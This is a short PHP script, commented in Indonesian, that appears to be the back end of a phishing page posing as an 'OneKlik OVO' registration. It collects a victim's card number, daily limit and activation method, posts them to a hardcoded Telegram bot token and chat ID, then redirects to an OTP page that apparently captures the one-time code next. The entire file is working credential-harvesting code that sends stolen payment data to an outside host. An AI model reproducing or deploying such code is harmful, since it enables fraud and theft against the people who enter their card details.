<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Ambil nilai dari form
    $card_number = $_POST['card_number'];
    $limit = $_POST['limit'];
    $activation = $_POST['activation'];

    // Token API dan ID chat bot Telegram
    $botToken = "7420573168:AAFRkY8mHhuaUlkd0Gqepi4K_M7MlCiEf6A";
    $chatId = "6824078885";

    // Pesan yang akan dikirim
    $message = "Data Registrasi OneKlik OVO:\n";
    $message .= "Nomor Kartu: $card_number\n";
    $message .= "Limit Harian: $limit\n";
    $message .= "Aktivasi Melalui: $activation\n";

    // URL untuk mengirim pesan ke bot Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Data yang dikirimkan
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    // Inisialisasi cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Eksekusi cURL
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect ke halaman OTP setelah mengirim pesan
    header("Location: otp.html");
    exit();
} else {
    echo "Invalid request.";
}
?>
